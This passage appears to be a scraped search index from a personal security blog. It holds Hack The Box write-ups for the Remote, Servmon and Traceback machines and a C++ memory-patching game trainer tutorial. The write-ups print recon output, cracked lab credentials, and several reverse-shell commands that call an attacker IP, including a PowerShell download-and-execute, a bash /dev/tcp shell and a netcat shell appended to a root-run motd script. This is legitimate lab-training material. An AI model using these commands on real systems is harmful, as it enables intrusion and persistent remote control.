=============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.180 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx [+] Timeout: 10s =============================================================== 2023/07/02 19:58:02 Starting gobuster in directory enumeration mode =============================================================== /.aspx (Status: 200) [Size: 6693] /contact (Status: 200) [Size: 7880] /contact.aspx (Status: 200) [Size: 7880] /blog.aspx (Status: 200) [Size: 5001] /home.aspx (Status: 200) [Size: 6703] /blog (Status: 200) [Size: 5011] /home (Status: 200) [Size: 6703] /products (Status: 200) [Size: 5328] /products.aspx (Status: 200) [Size: 5328] /default.aspx (Status: 200) [Size: 6693] /people.aspx (Status: 200) [Size: 6739] /people (Status: 200) [Size: 6739] /product.aspx (Status: 500) [Size: 3420] /product (Status: 500) [Size: 3420] /Default.aspx (Status: 200) [Size: 6693] /Home (Status: 200) [Size: 6703] /Home.aspx (Status: 200) [Size: 6703] /Products (Status: 200) [Size: 5338] /Products.aspx (Status: 200) [Size: 5338] /Contact (Status: 200) [Size: 7890] /Contact.aspx (Status: 200) [Size: 7890] /install (Status: 302) [Size: 126] [--\u0026gt; /umbraco/] /Blog.aspx (Status: 200) [Size: 5011] /Blog (Status: 200) [Size: 5011] /People.aspx (Status: 200) [Size: 6749] /People (Status: 200) [Size: 6749] /Product (Status: 500) [Size: 3420] /Product.aspx (Status: 500) [Size: 3420] Seems like there is a UMBRACO CMS, based on /install redirect We have Remote Code Execution exploits But I need to find the version and creds to be able to perform them Nothing found on SMB and FTP We can also check nfs on port 2049 which was returned by nmap └─$ showmount -e 10.10.10.180 Export list for 10.10.10.180: /site_backups (everyone) Foothold/User Let\u0026rsquo;s mount it If we check App_Data we will find SDF file Which is a file that contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft We can search for tools to open it But we can try using strings just to see its\u0026rsquo; contents: strings Umbraco.sdf | less Found some creds admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa smith@htb.local:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= Crack them right away admin@htb.local:baconandcheese Creds work, now we can access CMS Let\u0026rsquo;s try one of the exploits Change login, host, password, cmd and proc.StartInfo.FileName. Let\u0026rsquo;s get a reverse shell cmd = /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.12:8000/shell.ps1') Root Let\u0026rsquo;s upload winpeas and run it We have a list of interesting services TeamViewer There is a module in metasploit to gather TeamViewer credentials Let\u0026rsquo;s retrieve a password for registry: HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\TeamViewer\\\\Version7 OptionsPasswordAES, SecurityPasswordAES, SecurityPasswordExported, ServerPasswordAES, ProxyPasswordAES, LicenseKeyAES According to module, it looks like TeamViewer uses static key and iv Using metasploit\u0026rsquo;s module as reference we can write own script to decrypt the password You can use evil-winrm, psexec or wmiexec to connect as Administrator ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/remote/images/remote.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/remote/","summary":"Remote Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.180 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 18:25 BST Nmap scan report for 10.10.10.180 (10.10.10.180) Host is up (0.13s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?","tags":["HTB","nfs","umbraco","hashcat","teamviewer","evilwinrm"],"title":"[HTB] Machine: Remote"},{"categories":null,"contents":"Servmon Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.184 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 18:47 BST Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.14s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_02-28-22 07:35PM \u0026lt;DIR\u0026gt; Users 22/tcp open ssh OpenSSH for_Windows_8.0 (protocol 2.0) | ssh-hostkey: | 3072 c71af681ca1778d027dbcd462a092b54 (RSA) | 256 3e63ef3b6e3e4a90f34c02e940672e42 (ECDSA) |_ 256 5a48c8cd39782129effbae821d03adaf (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | X11Probe: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5666/tcp open tcpwrapped 6699/tcp open napster? 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers |_ jobs | http-title: NSClient++ |_Requested resource was /index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.93%I=7%D=6/30%Time=649F154D%P=x86_64-pc-linux-gnu%r(GetR SF:equest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nCon SF:tent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xe SF:f\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\ SF:x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-tra SF:nsitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtm SF:l\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;s SF:cript\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20w SF:indow\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(HTTPOption SF:s,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nContent- SF:Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xef\\xbb SF:\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\x20Tr SF:ansitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-transiti SF:onal\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtml\\\u0026#34;\u0026gt;\\ SF:r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;script SF:\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20window SF:\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;/scr SF:ipt\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(RTSPRequest,1B4 SF:,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nContent-Lengt SF:h:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xef\\xbb\\xbf\u0026lt; SF:!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\x20Transit SF:ional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-transitional\\ SF:.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;h SF:ead\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20t SF:ype=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20window\\.loc SF:ation\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;/script\u0026gt;\\ SF:r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(X11Probe,6B,\u0026#34;HTTP/1\\ SF:.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/html\\r\\nConten SF:t-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=6/30%Time=649F1554%P=x86_64-pc-linux-gn SF:u%r(GetRequest,74,\u0026#34;HTTP/1\\.1\\x20302\\r\\nContent-Length:\\x200\\r\\nLocation SF::\\x20/index\\.html\\r\\n\\r\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0 SF:\\0\\0\\0\\0\\0\\0\\x12\\x02\\x18\\0\\x1aE\\n\\x07workers\\x12\\x0b\\n\\x04jobs\\x12\\x03\\ SF:x18\\xcb\\x01\\x12\u0026#34;)%r(HTTPOptions,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Length: SF:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;)%r(FourOhFourRequest,36,\u0026#34;HTTP/1 SF:\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;)%r SF:(RTSPRequest,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\nDocum SF:ent\\x20not\\x20found\u0026#34;)%r(SIPOptions,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Leng SF:th:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-30T17:49:24 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 156.40 seconds Web servers FTP No results with SMB gobuster Had an error with random strings Found nothing by ignoring those cases └─$ gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.184 [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/30 19:18:38 Starting gobuster in directory enumeration mode =============================================================== Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.184/a11ab52c-c6be-4d66-bee8-f749550de92e =\u0026gt; 200 (Length: 118). To continue please exclude the status code or the length └─$ gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 --exclude-length 118 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.184 [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 118 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/30 19:19:46 Starting gobuster in directory enumeration mode =============================================================== Foothold/User Searchsploit We saw a note which stated that there is a passwords file at c:\\users\\nathan\\desktop Let\u0026rsquo;s leverage the directory traversal exploit to retrieve that file\u0026rsquo;s content We know that we have 3 users: Administrator, Nathan, Nadine Let\u0026rsquo;s check if any of the found passwords for any of these users crackmapexec smb 10.10.10.184 -u user.list -p passwd.list Match nadine:L1k3B1gBut7s@W0rk Connect via ssh Root Searchsploit When I was enumerating port 8443 there was an exploit for privesc Let\u0026rsquo;s check NSClient++ We found password and allowed hosts in nsclient.ini ew2x6SsGTxjRwXOT Let\u0026rsquo;s configure port forwarding and access page using found password I check the exploit, but it was way simpler to add a new script and execute it to get a reverse shell We need to upload nc.exe to the box: powershell wget http://10.10.16.7:8000/nc64.exe -outfile nc.exe Now we need to go to Settings \u0026gt; external scripts \u0026gt; scripts \u0026gt; Add a simple script Setup a listener and create script ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/servmon/images/servmon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/servmon/","summary":"Servmon Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.184 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 18:47 BST Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.14s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_02-28-22 07:35PM \u0026lt;DIR\u0026gt; Users 22/tcp open ssh OpenSSH for_Windows_8.0 (protocol 2.","tags":["HTB","ftp","nvms-1000","searchsploit","directory-traversal","lfi","ssh","crackmapexec","tunnel","exploit-db","nsclient++"],"title":"[HTB] Machine: Servmon"},{"categories":null,"contents":"Traceback Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.181 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 14:42 BST Nmap scan report for 10.10.10.181 (10.10.10.181) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9625518e6c830748ce114b1fe56d8a28 (RSA) | 256 54bd467114bdb242a1b6b02d94143b0d (ECDSA) |_ 256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.58 seconds Web server Since we have a hint that there is a web shell left We can the following list gobuster └─$ gobuster dir -u http://10.10.10.181 -w ./php-shells.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.181 [+] Method: GET [+] Threads: 50 [+] Wordlist: ./php-shells.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/29 16:39:39 Starting gobuster in directory enumeration mode =============================================================== /smevk.php (Status: 200) [Size: 1261] Progress: 847 / 848 (99.88%) =============================================================== 2023/06/29 16:39:46 Finished =============================================================== Foothold Web shell Let\u0026rsquo;s try default creds Let\u0026rsquo;s get a reverse shell Enter bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.7/6666 0\u0026gt;\u0026amp;1' to Execute field User Found a note inside home folder Also have sudo rights as sysadmin to execute luvit Since we are tracing the path of the attacker Checking the .bash_history reveals the privesc path We can try writing our key to authorized_keys Let\u0026rsquo;s write a script And run it as sysadmin ssh to box as sysadmin using the key Root After running linpeas, I launched pspy Found a cronjob that restores the contents of /etc/update-motd.d/ They are owned by sysadmin group We saw that the ssh banner was changed According to man page executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) --lsbsysinit option basically alphabetical order, with a few caveats). We can append reverse shell into one of these files Let\u0026rsquo;s try it echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 7777 \u0026gt;/tmp/f' \u0026gt;\u0026gt; 00-header Launch a listener and connect as sysadmin Rooted ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/traceback/images/traceback.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/traceback/","summary":"Traceback Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.181 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 14:42 BST Nmap scan report for 10.10.10.181 (10.10.10.181) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9625518e6c830748ce114b1fe56d8a28 (RSA) | 256 54bd467114bdb242a1b6b02d94143b0d (ECDSA) |_ 256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","webshell","vim","smevk","lua","luvit","ssh","motd","linpeas","linenum"],"title":"[HTB] Machine: Traceback"},{"categories":null,"contents":"DLL Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Simple C++ DLL Injector Source Code Tutorial Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/dll-injector/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/dll-injector/","summary":"DLL Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Simple C++ DLL Injector Source Code Tutorial Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] DLL Injector"},{"categories":null,"contents":"External Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project The following mini-project is walkthrough from Guided Hacking You can check the videos linked below in the references Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET Source Code Structure Folder View Solution View Proc proc.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace proc { DWORD GetProcId(const wchar_t* procName); uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName); uintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets); } proc.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;proc.h\u0026#34; DWORD proc::GetProcId(const wchar_t* procName) { DWORD procId = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap != INVALID_HANDLE_VALUE) { PROCESSENTRY32 procEntry; procEntry.dwSize = sizeof(procEntry); if (Process32First(hSnap, \u0026amp;procEntry)) { do { if (!_wcsicmp(procEntry.szExeFile, procName)) { procId = procEntry.th32ProcessID; break; } } while (Process32Next(hSnap, \u0026amp;procEntry)); } } CloseHandle(hSnap); return procId; } uintptr_t proc::GetModuleBaseAddress(DWORD procId, const wchar_t* modName) { uintptr_t modBaseAddr = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId); if (hSnap != INVALID_HANDLE_VALUE) { MODULEENTRY32 modEntry; modEntry.dwSize = sizeof(modEntry); if (Module32First(hSnap, \u0026amp;modEntry)) { do { if (!_wcsicmp(modEntry.szModule, modName)) { modBaseAddr = (uintptr_t)modEntry.modBaseAddr; break; } } while (Module32Next(hSnap, \u0026amp;modEntry)); } } CloseHandle(hSnap); return modBaseAddr; } uintptr_t proc::FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets) { uintptr_t addr = ptr; for (unsigned int i = 0; i \u0026lt; offsets.size(); ++i) { ReadProcessMemory(hProc, (BYTE*)addr, \u0026amp;addr, sizeof(addr), 0); addr += offsets[i]; } return addr; } Mem mem.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace mem { void PatchEx(BYTE* dst, BYTE* src, unsigned int size, HANDLE hProcess); void NopEx(BYTE* dst, unsigned int size, HANDLE hProcess); } mem.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;mem.h\u0026#34; void mem::PatchEx(BYTE* dst, BYTE* src, unsigned int size, HANDLE hProcess) { DWORD oldProtect; VirtualProtectEx(hProcess, dst, size, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtect); WriteProcessMemory(hProcess, dst, src, size, nullptr); VirtualProtectEx(hProcess, dst, size, oldProtect, \u0026amp;oldProtect); } void mem::NopEx(BYTE* dst, unsigned int size, HANDLE hProcess) { BYTE* nopArray = new BYTE[size]; memset(nopArray, 0x90, size); PatchEx(dst, nopArray, size, hProcess); delete[] nopArray; } Header Files stdafx.h #pragma once #include \u0026#34;targetver.h\u0026#34; #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; targetver.h #pragma once // Including SDKDDKVer.h defines the highest available Windows platform. // If you wish to build your application for a previous Windows platform, include WinSDKVer.h and // set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h. #include \u0026lt;SDKDDKVer.h\u0026gt; Source Files stdafx.cpp #include \u0026#34;stdafx.h\u0026#34; assaultcube_external_trainer.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;proc/proc.h\u0026#34; #include \u0026#34;mem/mem.h\u0026#34; int main() { HANDLE hProcess = 0; uintptr_t moduleBase = 0, localPlayerPtr = 0, healthAddr = 0; bool bHealth = false, bAmmo = false, bRecoil = false; const int newValue = 1337; //Get ProcId of the target process DWORD procId = proc::GetProcId(L\u0026#34;ac_client.exe\u0026#34;); if (procId) { //Get Handle to Process hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procId); //Getmodulebaseaddress moduleBase = proc::GetModuleBaseAddress(procId, L\u0026#34;ac_client.exe\u0026#34;); //Resolve address localPlayerPtr = moduleBase + 0x10f4f4; //Resolve base address of the pointer chain healthAddr = proc::FindDMAAddy(hProcess, localPlayerPtr, { 0xF8 }); } else { std::cout \u0026lt;\u0026lt; \u0026#34;Process not found, press enter to exit\\n\u0026#34;; return 0; } DWORD dwExit = 0; while (GetExitCodeProcess(hProcess, \u0026amp;dwExit) \u0026amp;\u0026amp; dwExit == STILL_ACTIVE) { //Health continuous write if (GetAsyncKeyState(VK_F1) \u0026amp; 1) { bHealth = !bHealth; } //unlimited ammo patch if (GetAsyncKeyState(VK_F2) \u0026amp; 1) { bAmmo = !bAmmo; if (bAmmo) { //FF 06 = inc [esi] mem::PatchEx((BYTE*)(moduleBase + 0x637e9), (BYTE*)\u0026#34;\\xFF\\x06\u0026#34;, 2, hProcess); } else { //FF 0E = dec [esi] mem::PatchEx((BYTE*)(moduleBase + 0x637e9), (BYTE*)\u0026#34;\\xFF\\x0E\u0026#34;, 2, hProcess); } } //no recoil NOP if (GetAsyncKeyState(VK_F3) \u0026amp; 1) { bRecoil = !bRecoil; if (bRecoil) { mem::NopEx((BYTE*)(moduleBase + 0x63786), 10, hProcess); } else { //50 8D 4C 24 1C 51 8B CE FF D2; the original stack setup and call mem::PatchEx((BYTE*)(moduleBase + 0x63786), (BYTE*)\u0026#34;\\x50\\x8D\\x4C\\x24\\x1C\\x51\\x8B\\xCE\\xFF\\xD2\u0026#34;, 10, hProcess); } } if (GetAsyncKeyState(VK_F4) \u0026amp; 1) { return 0; } //Continuous write if (bHealth) { mem::PatchEx((BYTE*)healthAddr, (BYTE*)\u0026amp;newValue, sizeof(newValue), hProcess); } Sleep(10); } std::cout \u0026lt;\u0026lt; \u0026#34;Process not found, press enter to exit\\n\u0026#34;; return 0; } Explanation TBA Proc and Mem source files Proc Mem Cheat Engine Reversing Recoil References Part 1 Part 2 Precompiled headers Recoil RE ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/external-trainer/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/external-trainer/","summary":"External Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project The following mini-project is walkthrough from Guided Hacking You can check the videos linked below in the references Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET Source Code Structure Folder View Solution View Proc proc.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace proc { DWORD GetProcId(const wchar_t* procName); uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName); uintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets); } proc.","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] External Trainer"},{"categories":null,"contents":"Internal Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET References Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/internal-trainer/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/internal-trainer/","summary":"Internal Trainer Checkout official Guided Hacking website for more 